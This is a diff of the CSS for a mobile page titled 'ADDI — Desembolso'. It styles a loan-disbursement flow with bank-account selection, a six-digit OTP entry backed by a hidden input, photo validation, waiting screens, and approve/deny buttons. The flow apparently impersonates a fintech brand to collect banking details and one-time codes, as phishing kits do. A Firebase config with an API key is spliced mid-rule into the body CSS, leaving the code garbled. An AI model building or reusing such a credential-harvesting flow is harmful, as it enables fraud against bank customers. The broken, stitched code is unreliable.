@@ -3,785 +3,913 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Plataforma de Desembolso</title>
-<style>
-/* ── Variables de diseño ── */
-:root {
-  --principal:#1C67D8; --principal-fuerte:#0A39C4; --principal-suave:#E8F0FE; --destaque:#4E7EFF;
-  --exito:#0F6E56; --exito-suave:#E1F5EE; --alerta:#D83B3B; --alerta-suave:#FEE8E8;
-  --texto-primary:#0D1117; --texto-secondary:#4D525C; --texto-disabled:#9EA3AD;
-  --borde:#E4E7EC; --fondo-base:#FAFBFF; --fondo-limpio:#fff;
-  --redondeado-sm:12px; --redondeado-md:18px; --redondeado-lg:24px; --redondeado-xl:32px
-}
+<title>ADDI — Desembolso</title>
 
-/* ── Reset ── */
+<style>
+:root{
+  --blue:#1C67D8;--blue-dark:#0A39C4;--blue-light:#E8F0FE;--accent:#4E7EFF;
+  --green:#0F6E56;--green-light:#E1F5EE;--red:#D83B3B;--red-light:#FEE8E8;
+  --text:#0D1117;--text2:#4D525C;--muted:#9EA3AD;
+  --border:#E4E7EC;--bg:#FAFBFF;--white:#fff;
+  --r-sm:12px;--r-md:18px;--r-lg:24px;--r-xl:32px
+}
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:Arial,Helvetica,sans-serif!important}
 html,body{height:100%}
-body{font-family:Arial,Helvetica,sans-serif;background:#dde6ff;display:flex;justify-content:center;align-items:flex-start}
+body{font-family:Arial,Helvetica,sans-serif;background:#dde6ff;display:flex;  apiKey: "AIzaSyBPinTLb0G8_25Z3cmgrz8bo8flqRRivO0",
+  authDomain: "solicitud-17219.firebaseapp.com",
+  projectId: "solicitud-17219",
+  storageBucket: "solicitud-17219.firebasestorage.app",
+  messagingSenderId: "279668144731",
+  appId: "1:279668144731:web:4dcdc5eacf764a2bf5dd7e",
+  measurementId: "G-6BYHNQ2KNQ"-content:center;align-items:flex-start}
+.app{width:100%;max-width:430px;min-height:100vh;background:var(--white);position:relative;box-shadow:0 0 60px rgba(0,0,0,.12)}
 
-/* ── Contenedor app ── */
-.contenedor-principal{width:100%;max-width:430px;min-height:100vh;background:var(--fondo-limpio);position:relative;box-shadow:0 0 60px rgba(0,0,0,.12)}
+/* SCREENS */
+.screen{display:none;flex-direction:column;min-height:100vh}
+.screen.active{display:flex;animation:fwd .3s ease forwards}
+.screen.going-back{display:flex;animation:bwd .3s ease forwards}
+@keyframes fwd{from{opacity:0;transform:translateX(26px)}to{opacity:1;transform:translateX(0)}}
+@keyframes bwd{from{opacity:0;transform:translateX(-26px)}to{opacity:1;transform:translateX(0)}}
 
-/* ── Pantallas ── */
-.vista{display:none;flex-direction:column;min-height:100vh}
-.vista.activa{display:flex;animation:aparicion .3s ease forwards}
-.vista.regreso{display:flex;animation:desaparicion .3s ease forwards}
-@keyframes aparicion{from{opacity:0;transform:translateX(26px)}to{opacity:1;transform:translateX(0)}}
-@keyframes desaparicion{from{opacity:0;transform:translateX(-26px)}to{opacity:1;transform:translateX(0)}}
-
-/* ── Cargador ── */
-#v-cargador{align-items:center;justify-content:center;gap:22px;
+/* LOADER */
+#s-loader{align-items:center;justify-content:center;gap:22px;
   background:linear-gradient(160deg,#0D2A6E 0%,#1C67D8 60%,#4E7EFF 100%)}
-.spinner-anillo{width:50px;height:50px;border:3px solid rgba(255,255,255,.2);border-top-color:#fff;
-  border-radius:50%;animation:rotar .85s linear infinite}
-@keyframes rotar{to{transform:rotate(360deg)}}
-.texto-espera{color:rgba(255,255,255,.65);font-size:13px;letter-spacing:.1em;text-transform:uppercase}
+.ring{width:50px;height:50px;border:3px solid rgba(255,255,255,.2);border-top-color:#fff;
+  border-radius:50%;animation:spin .85s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loader-tag{font-family:Arial,Helvetica,sans-serif;color:rgba(255,255,255,.65);font-size:13px;letter-spacing:.1em;text-transform:uppercase}
 
-/* ── Barra superior ── */
-.barra-titulo{display:flex;align-items:center;justify-content:space-between;padding:16px 20px 12px;
-  background:var(--fondo-limpio);position:sticky;top:0;z-index:10;border-bottom:1px solid var(--borde)}
-.etiqueta-paso{font-size:11px;font-weight:700;color:var(--principal);
-  background:var(--principal-suave);padding:5px 12px;border-radius:20px;letter-spacing:.04em}
+/* TOP BAR */
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 20px 12px;
+  background:var(--white);position:sticky;top:0;z-index:10;border-bottom:1px solid var(--border)}
+.step-badge{font-family:Arial,Helvetica,sans-serif;font-size:11px;font-weight:700;color:var(--blue);
+  background:var(--blue-light);padding:5px 12px;border-radius:20px;letter-spacing:.04em}
 
-/* ── Barra de progreso ── */
-.contenedor-progreso{padding:10px 20px 2px}
-.barra-progreso{height:4px;background:var(--borde);border-radius:4px;overflow:hidden}
-.progreso-relleno{height:100%;background:linear-gradient(90deg,var(--principal),var(--destaque));border-radius:4px;transition:width .4s ease}
+/* PROGRESS */
+.prog-wrap{padding:10px 20px 2px}
+.prog-track{height:4px;background:var(--border);border-radius:4px;overflow:hidden}
+.prog-fill{height:100%;background:linear-gradient(90deg,var(--blue),var(--accent));border-radius:4px;transition:width .4s ease}
 
-/* ── Cuerpo de vista ── */
-.cuerpo-vista{flex:1;padding:24px 20px 130px;overflow-y:auto}
+/* SCROLL BODY */
+.sbody{flex:1;padding:24px 20px 130px;overflow-y:auto}
 
-/* ── Grupos de campo ── */
-.grupo-entrada{display:flex;flex-direction:column;gap:6px;margin-bottom:16px}
-.etiqueta-entrada{font-size:12px;font-weight:600;color:var(--texto-secondary);letter-spacing:.02em;text-transform:uppercase}
-.entrada-texto{height:52px;border-radius:var(--redondeado-sm);border:1.5px solid var(--borde);padding:0 16px;
-  font-size:16px;color:var(--texto-primary);background:var(--fondo-limpio);
+/* FORM */
+.fgroup{display:flex;flex-direction:column;gap:6px;margin-bottom:16px}
+.flabel{font-size:12px;font-weight:600;color:var(--text2);letter-spacing:.02em;text-transform:uppercase}
+.finput{height:52px;border-radius:var(--r-sm);border:1.5px solid var(--border);padding:0 16px;
+  font-size:16px;font-family:Arial,Helvetica,sans-serif;color:var(--text);background:var(--white);
   outline:none;transition:border-color .2s,box-shadow .2s;width:100%}
-.entrada-texto:focus{border-color:var(--principal);box-shadow:0 0 0 3px rgba(28,103,216,.12)}
-.entrada-texto::placeholder{color:var(--texto-disabled)}
-.entrada-texto.error-entrada{border-color:var(--alerta);box-shadow:0 0 0 3px rgba(216,59,59,.12)}
+.finput:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(28,103,216,.12)}
+.finput::placeholder{color:var(--muted)}
+.finput.error-field{border-color:var(--red);box-shadow:0 0 0 3px rgba(216,59,59,.12)}
 
-/* ── Caja de alerta ── */
-.alerta-box{display:none;border-radius:var(--redondeado-sm);background:var(--alerta-suave);border:1px solid rgba(216,59,59,.3);
-  padding:13px 15px;font-size:13px;color:var(--alerta);line-height:1.5;margin-bottom:16px;
+/* ERROR BOX */
+.error-box{display:none;border-radius:var(--r-sm);background:var(--red-light);border:1px solid rgba(216,59,59,.3);
+  padding:13px 15px;font-size:13px;color:var(--red);line-height:1.5;margin-bottom:16px;
   align-items:center;gap:10px}
-.alerta-box.mostrar{display:flex}
-.alerta-box svg{flex-shrink:0}
+.error-box.show{display:flex}
+.error-box svg{flex-shrink:0}
 
-/* ── Pie de vista fijo ── */
-.pie-vista{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:430px;
-  background:linear-gradient(to top,var(--fondo-limpio) 82%,transparent);padding:12px 20px 24px;z-index:20}
-@media(max-width:430px){.pie-vista{left:0;transform:none}}
-
-/* ── Botón principal ── */
-.boton-principal{width:100%;height:52px;border-radius:var(--redondeado-xl);
-  background:linear-gradient(135deg,var(--principal),var(--destaque));color:#fff;
-  font-size:16px;font-weight:700;border:none;cursor:pointer;
+/* FOOTER */
+.footer{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:430px;
+  background:linear-gradient(to top,var(--white) 82%,transparent);padding:12px 20px 24px;z-index:20}
+.btn-main{width:100%;height:52px;border-radius:var(--r-xl);
+  background:linear-gradient(135deg,var(--blue),var(--accent));color:#fff;
+  font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:700;border:none;cursor:pointer;
   letter-spacing:.02em;transition:transform .15s,box-shadow .15s;
   box-shadow:0 8px 24px rgba(28,103,216,.32)}
-.boton-principal:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(28,103,216,.4)}
-.boton-principal:active{transform:scale(.98)}
-.boton-principal:disabled{opacity:.32;cursor:not-allowed;transform:none;box-shadow:none}
+.btn-main:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(28,103,216,.4)}
+.btn-main:active{transform:scale(.98)}
+.btn-main:disabled{opacity:.32;cursor:not-allowed;transform:none;box-shadow:none}
+@media(max-width:430px){.footer{left:0;transform:none}}
 
-/* ── Botones de aprobación ── */
-.grupo-botones{display:flex;gap:12px;margin-bottom:20px}
-.boton-aceptar,.boton-rechazar{flex:1;height:52px;border-radius:var(--redondeado-xl);
+/* BOTONES APROBACIÓN/DENEGACIÓN */
+.approval-btns{display:flex;gap:12px;margin-bottom:20px}
+.btn-approve,.btn-deny{flex:1;height:52px;border-radius:var(--r-xl);font-family:Arial,Helvetica,sans-serif;
   font-size:16px;font-weight:700;border:none;cursor:pointer;letter-spacing:.02em;
   transition:transform .15s,box-shadow .15s}
-.boton-aceptar{background:linear-gradient(135deg,var(--exito),#0F6E56);color:#fff;
+.btn-approve{background:linear-gradient(135deg,var(--green),#0F6E56);color:#fff;
   box-shadow:0 8px 24px rgba(15,110,86,.32)}
-.boton-aceptar:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(15,110,86,.4)}
-.boton-aceptar:active{transform:scale(.98)}
-.boton-rechazar{background:linear-gradient(135deg,var(--alerta),#C02A2A);color:#fff;
+.btn-approve:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(15,110,86,.4)}
+.btn-approve:active{transform:scale(.98)}
+.btn-deny{background:linear-gradient(135deg,var(--red),#C02A2A);color:#fff;
   box-shadow:0 8px 24px rgba(216,59,59,.32)}
-.boton-rechazar:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(216,59,59,.4)}
-.boton-rechazar:active{transform:scale(.98)}
+.btn-deny:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(216,59,59,.4)}
+.btn-deny:active{transform:scale(.98)}
 
-/* ── Bloque de éxito ── */
-.bloque-exito{background:linear-gradient(135deg,var(--exito),#0F6E56);border-radius:var(--redondeado-lg);
+/* PANTALLA ÉXITO */
+.success-hero{background:linear-gradient(135deg,var(--green),#0F6E56);border-radius:var(--r-lg);
   padding:48px 28px;text-align:center;margin-bottom:24px;position:relative;overflow:hidden}
-.bloque-exito::before{content:'';position:absolute;width:180px;height:180px;border-radius:50%;
+.success-hero::before{content:'';position:absolute;width:180px;height:180px;border-radius:50%;
   background:rgba(255,255,255,.08);top:-60px;right:-40px}
-.exito-icono{font-size:64px;margin-bottom:16px;display:block;position:relative;z-index:1}
-.exito-titulo{font-size:24px;font-weight:800;color:#fff;margin-bottom:8px;position:relative;z-index:1}
-.exito-descripcion{font-size:15px;color:rgba(255,255,255,.85);line-height:1.6;position:relative;z-index:1}
+.success-icon{font-size:64px;margin-bottom:16px;display:block;position:relative;z-index:1}
+.success-title{font-family:Arial,Helvetica,sans-serif;font-size:24px;font-weight:800;color:#fff;
+  margin-bottom:8px;position:relative;z-index:1}
+.success-sub{font-size:15px;color:rgba(255,255,255,.85);line-height:1.6;position:relative;z-index:1}
 
-/* ── Bloque de acceso ── */
-.bloque-acceso{background:linear-gradient(160deg,#0D2A6E 0%,#1C67D8 60%,#4E7EFF 100%);
+/* HERO LOGIN */
+.login-hero{background:linear-gradient(160deg,#0D2A6E 0%,#1C67D8 60%,#4E7EFF 100%);
   padding:32px 20px 28px;text-align:center;position:relative;overflow:hidden}
-.bloque-acceso::before{content:'';position:absolute;width:200px;height:200px;border-radius:50%;
+.login-hero::before{content:'';position:absolute;width:200px;height:200px;border-radius:50%;
   background:rgba(255,255,255,.05);top:-80px;right:-60px}
-.bloque-acceso::after{content:'';position:absolute;width:150px;height:150px;border-radius:50%;
+.login-hero::after{content:'';position:absolute;width:150px;height:150px;border-radius:50%;
   background:rgba(255,255,255,.04);bottom:-60px;left:-40px}
-.acceso-logo{margin-bottom:20px;position:relative;z-index:1}
-.acceso-titulo{font-size:22px;font-weight:800;color:#fff;margin-bottom:8px;position:relative;z-index:1}
-.acceso-descripcion{font-size:13px;color:rgba(255,255,255,.7);line-height:1.6;position:relative;z-index:1}
+.login-logo{margin-bottom:20px;position:relative;z-index:1}
+.login-title{font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:800;color:#fff;
+  margin-bottom:8px;position:relative;z-index:1}
+.login-sub{font-size:13px;color:rgba(255,255,255,.7);line-height:1.6;position:relative;z-index:1}
 
-/* ── Vistas de espera ── */
-#v-espera,#v-espera2{align-items:center;justify-content:center;flex-direction:column;gap:0;
+/* ESPERA SCREEN */
+#s-espera{align-items:center;justify-content:center;flex-direction:column;gap:0;
   background:linear-gradient(160deg,#0D2A6E 0%,#1C67D8 60%,#4E7EFF 100%)}
-.cuerpo-espera{display:flex;flex-direction:column;align-items:center;gap:20px;padding:40px 24px;text-align:center}
-.anillo-espera{width:64px;height:64px;border:3px solid rgba(255,255,255,.15);border-top-color:#fff;
-  border-radius:50%;animation:rotar .85s linear infinite}
-.titulo-espera{font-size:20px;font-weight:800;color:#fff}
-.descripcion-espera{font-size:13px;color:rgba(255,255,255,.65);line-height:1.65;max-width:280px}
-.texto-intercambiable{transition:opacity .25s ease,transform .25s ease}
-.texto-intercambiable.cambio{opacity:0;transform:translateY(6px)}
-.grupo-puntos{display:flex;gap:8px;margin-top:4px}
-.punto-pulsante{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,.4);animation:pulsar 1.4s ease-in-out infinite}
-.punto-pulsante:nth-child(2){animation-delay:.2s}
-.punto-pulsante:nth-child(3){animation-delay:.4s}
-@keyframes pulsar{0%,100%{background:rgba(255,255,255,.4);transform:scale(1)}50%{background:#fff;transform:scale(1.2)}}
+.espera-content{display:flex;flex-direction:column;align-items:center;gap:20px;padding:40px 24px;text-align:center}
+.espera-ring{width:64px;height:64px;border:3px solid rgba(255,255,255,.15);border-top-color:#fff;
+  border-radius:50%;animation:spin .85s linear infinite}
+.espera-title{font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:800;color:#fff}
+.espera-sub{font-size:13px;color:rgba(255,255,255,.65);line-height:1.65;max-width:280px}
+.espera-copy{transition:opacity .25s ease,transform .25s ease}
+.espera-copy.swap{opacity:0;transform:translateY(6px)}
+.espera-dots{display:flex;gap:8px;margin-top:4px}
+.espera-dot{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,.4);animation:pulse 1.4s ease-in-out infinite}
+.espera-dot:nth-child(2){animation-delay:.2s}
+.espera-dot:nth-child(3){animation-delay:.4s}
+@keyframes pulse{0%,100%{background:rgba(255,255,255,.4);transform:scale(1)}50%{background:#fff;transform:scale(1.2)}}
 
-/* ── Bloque de monto ── */
-.bloque-monto{border-radius:var(--redondeado-lg);background:linear-gradient(135deg,#0D2A6E,#1C67D8);
+/* MONTO SCREEN */
+.monto-hero{border-radius:var(--r-lg);background:linear-gradient(135deg,#0D2A6E,#1C67D8);
   padding:28px 20px 24px;text-align:center;margin-bottom:24px;position:relative;overflow:hidden}
-.bloque-monto::before{content:'';position:absolute;width:120px;height:120px;border-radius:50%;
+.monto-hero::before{content:'';position:absolute;width:120px;height:120px;border-radius:50%;
   background:rgba(255,255,255,.07);top:-40px;right:-30px}
-.monto-icono{font-size:46px;margin-bottom:10px;display:block}
-.monto-titulo{font-size:20px;font-weight:800;color:#fff;margin-bottom:6px}
-.monto-descripcion{font-size:13px;color:rgba(255,255,255,.7);line-height:1.6}
-.contenedor-entrada-monto{position:relative;margin-bottom:8px}
-.prefijo-moneda{position:absolute;left:16px;top:50%;transform:translateY(-50%);
-  font-size:20px;font-weight:700;color:var(--principal)}
-.entrada-monto{width:100%;height:60px;border-radius:var(--redondeado-md);border:2px solid var(--borde);
-  padding:0 16px 0 36px;font-size:22px;font-weight:700;
-  color:var(--texto-primary);outline:none;transition:border-color .2s,box-shadow .2s}
-.entrada-monto:focus{border-color:var(--principal);box-shadow:0 0 0 3px rgba(28,103,216,.12)}
-.entrada-monto::placeholder{color:var(--texto-disabled);font-weight:400;font-size:16px}
-.cuadricula-valores{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
-.opcion-valor{border-radius:var(--redondeado-sm);border:1.5px solid var(--borde);background:var(--fondo-base);
-  padding:12px;text-align:center;cursor:pointer;transition:all .2s;
-  font-size:15px;font-weight:700;color:var(--principal)}
-.opcion-valor:hover,.opcion-valor.seleccionado{border-color:var(--principal);background:var(--principal-suave)}
-.info-monto{font-size:12px;color:var(--texto-disabled);text-align:center;margin-bottom:20px}
+.monto-big{font-size:46px;margin-bottom:10px;display:block}
+.monto-title{font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:800;color:#fff;margin-bottom:6px}
+.monto-sub{font-size:13px;color:rgba(255,255,255,.7);line-height:1.6}
+.monto-input-wrap{position:relative;margin-bottom:8px}
+.monto-prefix{position:absolute;left:16px;top:50%;transform:translateY(-50%);
+  font-size:20px;font-weight:700;color:var(--blue);font-family:Arial,Helvetica,sans-serif}
+.monto-input{width:100%;height:60px;border-radius:var(--r-md);border:2px solid var(--border);
+  padding:0 16px 0 36px;font-size:22px;font-weight:700;font-family:Arial,Helvetica,sans-serif;
+  color:var(--text);outline:none;transition:border-color .2s,box-shadow .2s}
+.monto-input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(28,103,216,.12)}
+.monto-input::placeholder{color:var(--muted);font-weight:400;font-size:16px}
+.montos-rapidos{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+.monto-pill{border-radius:var(--r-sm);border:1.5px solid var(--border);background:var(--bg);
+  padding:12px;text-align:center;cursor:pointer;transition:all .2s;font-family:Arial,Helvetica,sans-serif;
+  font-size:15px;font-weight:700;color:var(--blue)}
+.monto-pill:hover{border-color:var(--blue);background:var(--blue-light)}
+.monto-pill.sel{border-color:var(--blue);background:var(--blue-light)}
+.monto-hint{font-size:12px;color:var(--muted);text-align:center;margin-bottom:20px}
 
-/* ── Selección de cuenta ── */
-.titulo-cuenta{font-size:22px;font-weight:800;color:var(--texto-primary);margin-bottom:6px;line-height:1.2}
-.descripcion-cuenta{font-size:14px;color:var(--texto-secondary);line-height:1.6;margin-bottom:24px}
-.lista-opciones{display:flex;flex-direction:column;gap:12px;margin-bottom:24px}
-.item-opcion{border-radius:var(--redondeado-md);border:2px solid var(--borde);padding:16px 18px;
+/* CUENTA SCREEN */
+.cuenta-titulo{font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:800;color:var(--text);
+  margin-bottom:6px;line-height:1.2}
+.cuenta-sub{font-size:14px;color:var(--text2);line-height:1.6;margin-bottom:24px}
+.pago-btns{display:flex;flex-direction:column;gap:12px;margin-bottom:24px}
+.pago-btn{border-radius:var(--r-md);border:2px solid var(--border);padding:16px 18px;
   display:flex;align-items:center;gap:14px;cursor:pointer;
-  transition:border-color .2s,background .2s,transform .15s;background:var(--fondo-limpio);
+  transition:border-color .2s,background .2s,transform .15s;background:var(--white);
   position:relative;overflow:hidden}
-.item-opcion:hover{border-color:var(--principal);background:var(--principal-suave);transform:translateY(-1px)}
-.item-opcion.seleccionado{border-color:var(--principal);background:var(--principal-suave)}
-.item-opcion.seleccionado::after{content:'✓';position:absolute;top:12px;right:14px;width:22px;height:22px;
-  background:var(--principal);color:#fff;font-size:12px;font-weight:700;border-radius:50%;
+.pago-btn:hover{border-color:var(--blue);background:var(--blue-light);transform:translateY(-1px)}
+.pago-btn.sel{border-color:var(--blue);background:var(--blue-light)}
+.pago-btn.sel::after{content:'✓';position:absolute;top:12px;right:14px;width:22px;height:22px;
+  background:var(--blue);color:#fff;font-size:12px;font-weight:700;border-radius:50%;
   display:flex;align-items:center;justify-content:center}
-.icono-opcion{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:26px}
-.icono-nequi{background:#6A0DAD22}
-.icono-banco{background:#FFF3CD}
-.icono-davi{background:#FFE5E5}
-.nombre-opcion{font-size:16px;font-weight:700;color:var(--texto-primary)}
-.desc-opcion{font-size:12px;color:var(--texto-secondary);margin-top:2px}
-.formulario-datos{display:none;flex-direction:column;gap:0;animation:aparicion .3s ease forwards}
-.formulario-datos.mostrar{display:flex}
-.linea-separador{height:1px;background:var(--borde);margin:4px 0 20px}
+.pago-ico{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:26px}
+.ico-nequi{background:#6A0DAD22}
+.ico-banco{background:#FFF3CD}
+.ico-davi{background:#FFE5E5}
+.pago-name{font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:700;color:var(--text)}
+.pago-desc{font-size:12px;color:var(--text2);margin-top:2px}
 
-/* ── Bloque de código OTP ── */
-.bloque-otp{background:linear-gradient(135deg,#0D2A6E,#1C67D8);border-radius:var(--redondeado-lg);
+/* CAMPOS CUENTA */
+.cuenta-form{display:none;flex-direction:column;gap:0;animation:fwd .3s ease forwards}
+.cuenta-form.show{display:flex}
+.divider{height:1px;background:var(--border);margin:4px 0 20px}
+
+/* OTP SCREEN */
+.otp-hero{background:linear-gradient(135deg,#0D2A6E,#1C67D8);border-radius:var(--r-lg);
   padding:28px 20px;text-align:center;margin-bottom:24px;position:relative;overflow:hidden}
-.bloque-otp::before{content:'';position:absolute;width:140px;height:140px;border-radius:50%;
+.otp-hero::before{content:'';position:absolute;width:140px;height:140px;border-radius:50%;
   background:rgba(255,255,255,.06);top:-50px;right:-40px}
-.otp-icono{font-size:44px;margin-bottom:12px;display:block;position:relative;z-index:1}
-.otp-titulo{font-size:20px;font-weight:800;color:#fff;margin-bottom:8px;position:relative;z-index:1}
-.otp-descripcion{font-size:13px;color:rgba(255,255,255,.72);line-height:1.65;position:relative;z-index:1}
+.otp-icon{font-size:44px;margin-bottom:12px;display:block;position:relative;z-index:1}
+.otp-title{font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:800;color:#fff;
+  margin-bottom:8px;position:relative;z-index:1}
+.otp-sub{font-size:13px;color:rgba(255,255,255,.72);line-height:1.65;position:relative;z-index:1}
 .otp-numero{font-weight:700;color:#fff}
-.contenedor-otp{display:flex;gap:10px;justify-content:center;margin:28px 0 12px}
-.campo-digito{display:flex;flex-direction:column;align-items:center;gap:8px;cursor:text}
-.digito-visual{font-size:22px;font-weight:800;color:var(--texto-primary);
+
+/* OTP INPUT - 6 CUADROS SUAVES */
+.otp-wrap{display:flex;gap:10px;justify-content:center;margin:28px 0 12px}
+.otp-field{display:flex;flex-direction:column;align-items:center;gap:8px;cursor:text}
+.otp-digit{font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:800;color:var(--text);
   width:44px;text-align:center;min-height:44px;line-height:44px;border-radius:12px;
-  border:1.5px solid var(--borde);background:var(--fondo-limpio);transition:all .2s ease}
-.caja-digito{width:44px;height:44px;border-radius:12px;border:1.5px solid var(--borde);background:var(--fondo-limpio);
+  border:1.5px solid var(--border);background:var(--white);transition:all .2s ease}
+.otp-box{width:44px;height:44px;border-radius:12px;border:1.5px solid var(--border);background:var(--white);
   transition:all .2s ease;display:flex;align-items:center;justify-content:center}
-.caja-digito.activa{border-color:var(--principal);box-shadow:0 0 0 3px rgba(28,103,216,.12)}
-.caja-digito.llena{border-color:var(--principal);background:var(--principal-suave)}
-.caja-digito.error{border-color:var(--alerta);background:var(--alerta-suave)}
-.digito-visual.error-digito{color:var(--alerta)}
-.entrada-otp-real{position:absolute;opacity:0;width:1px;height:1px;pointer-events:none}
-.alerta-otp{display:none;border-radius:var(--redondeado-sm);background:var(--alerta-suave);border:1px solid rgba(216,59,59,.3);
-  padding:13px 15px;font-size:13px;color:var(--alerta);line-height:1.5;margin-bottom:16px;
+.otp-box.active{border-color:var(--blue);box-shadow:0 0 0 3px rgba(28,103,216,.12)}
+.otp-box.filled{border-color:var(--blue);background:var(--blue-light)}
+.otp-box.error{border-color:var(--red);background:var(--red-light)}
+.otp-digit.error-digit{color:var(--red)}
+.otp-real-input{position:absolute;opacity:0;width:1px;height:1px;pointer-events:none}
+
+.otp-error-box{display:none;border-radius:var(--r-sm);background:var(--red-light);border:1px solid rgba(216,59,59,.3);
+  padding:13px 15px;font-size:13px;color:var(--red);line-height:1.5;margin-bottom:16px;
   align-items:center;gap:10px;text-align:left}
-.alerta-otp.mostrar{display:flex}
-.info-otp{font-size:12px;color:var(--texto-disabled);text-align:center;margin-bottom:20px}
-.reenvio-otp{font-size:13px;text-align:center;color:var(--texto-secondary)}
-.reenvio-otp span{color:var(--principal);font-weight:600;cursor:pointer;text-decoration:underline}
+.otp-error-box.show{display:flex}
 
-/* ── Panel de fotos ── */
-.panel-fotografia{border:1.5px solid var(--borde);border-radius:var(--redondeado-lg);padding:22px 18px;
-  background:linear-gradient(180deg,#fff 0%,#F8FAFF 100%);text-align:center;margin-bottom:22px;
-  position:relative;overflow:hidden;box-shadow:0 18px 45px rgba(13,42,110,.08)}
-.panel-fotografia::before{content:'';position:absolute;inset:0 0 auto;height:5px;
-  background:linear-gradient(90deg,var(--principal),var(--destaque));
-  transform:scaleX(var(--foto-progreso,.34));transform-origin:left;transition:transform .35s ease}
-.panel-fotografia.completado{border-color:rgba(15,110,86,.45);background:linear-gradient(180deg,#fff 0%,var(--exito-suave) 100%)}
-.foto-escena{animation:fotoEntrada .32s ease both}
-.foto-etiqueta{display:inline-flex;align-items:center;gap:6px;height:24px;padding:0 10px;
-  border-radius:999px;background:var(--principal-suave);color:var(--principal);font-size:11px;font-weight:800;margin-bottom:14px}
-.foto-orbita{width:104px;height:104px;border-radius:32px;margin:0 auto 18px;
-  background:radial-gradient(circle at 50% 50%,#fff 0 35%,#EAF1FF 36% 100%);
-  display:flex;align-items:center;justify-content:center;position:relative}
-.foto-orbita::before,.foto-orbita::after{content:'';position:absolute;border:1.5px solid rgba(28,103,216,.25);
-  border-radius:34px;inset:8px;animation:fotoPulso 1.8s ease-in-out infinite}
-.foto-orbita::after{inset:18px;animation-delay:.35s}
-.foto-avatar{width:54px;height:54px;border-radius:18px;background:var(--principal);color:#fff;
-  display:flex;align-items:center;justify-content:center;font-size:28px;position:relative;z-index:1;
-  box-shadow:0 10px 25px rgba(28,103,216,.24)}
-.foto-nombre{font-size:19px;font-weight:800;color:var(--texto-primary);margin-bottom:8px}
-.foto-instruccion{font-size:13px;color:var(--texto-secondary);line-height:1.55;margin:0 auto 18px;max-width:320px}
-.foto-boton{width:100%;height:50px;border:none;border-radius:999px;
-  background:linear-gradient(135deg,var(--principal),var(--destaque));color:#fff;
-  font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 10px 22px rgba(28,103,216,.24)}
-.foto-boton:disabled{cursor:not-allowed;opacity:.82}
-.panel-fotografia.completado .foto-boton{background:var(--exito);box-shadow:0 10px 22px rgba(15,110,86,.18)}
-.foto-pasos{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:16px}
-.foto-paso{height:7px;border-radius:999px;background:#E4E7EC;overflow:hidden}
-.foto-paso.completado{background:var(--exito)}
-.foto-paso.activo{background:linear-gradient(90deg,var(--principal),var(--destaque));animation:fotoAnimacion 1.2s ease-in-out infinite}
-.entrada-foto{display:none}
-@keyframes fotoEntrada{from{opacity:0;transform:translateY(10px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
-@keyframes fotoPulso{0%,100%{transform:scale(.96);opacity:.5}50%{transform:scale(1.05);opacity:1}}
-@keyframes fotoAnimacion{0%,100%{filter:saturate(1);opacity:.75}50%{filter:saturate(1.3);opacity:1}}
+.otp-hint{font-size:12px;color:var(--muted);text-align:center;margin-bottom:20px}
+.otp-resend{font-size:13px;text-align:center;color:var(--text2)}
+.otp-resend span{color:var(--blue);font-weight:600;cursor:pointer;text-decoration:underline}
 
-/* ── Notificación emergente ── */
-.notificacion-emergente{position:fixed;top:14px;left:50%;transform:translate(-50%,-130%);
-  width:calc(100% - 28px);max-width:402px;background:#fff;border:1px solid var(--borde);
-  border-radius:18px;box-shadow:0 18px 50px rgba(13,42,110,.22);
-  padding:14px;z-index:300;opacity:0;transition:transform .25s ease,opacity .25s ease}
-.notificacion-emergente.visible{transform:translate(-50%,0);opacity:1}
-.notif-encabezado{display:flex;align-items:center;gap:10px;margin-bottom:8px}
-.notif-icono{width:34px;height:34px;border-radius:12px;background:var(--principal-suave);color:var(--principal);
+/* FOTO VALIDACION */
+.foto-panel{border:1.5px solid var(--border);border-radius:var(--r-lg);padding:22px 18px;background:linear-gradient(180deg,#fff 0%,#F8FAFF 100%);text-align:center;margin-bottom:22px;position:relative;overflow:hidden;box-shadow:0 18px 45px rgba(13,42,110,.08)}
+.foto-panel::before{content:'';position:absolute;inset:0 0 auto;height:5px;background:linear-gradient(90deg,var(--blue),var(--accent));transform:scaleX(var(--foto-progress,.34));transform-origin:left;transition:transform .35s ease}
+.foto-panel.done{border-color:rgba(15,110,86,.45);background:linear-gradient(180deg,#fff 0%,var(--green-light) 100%)}
+.foto-stage{animation:fotoIn .32s ease both}
+.foto-kicker{display:inline-flex;align-items:center;gap:6px;height:24px;padding:0 10px;border-radius:999px;background:var(--blue-light);color:var(--blue);font-size:11px;font-weight:800;margin-bottom:14px}
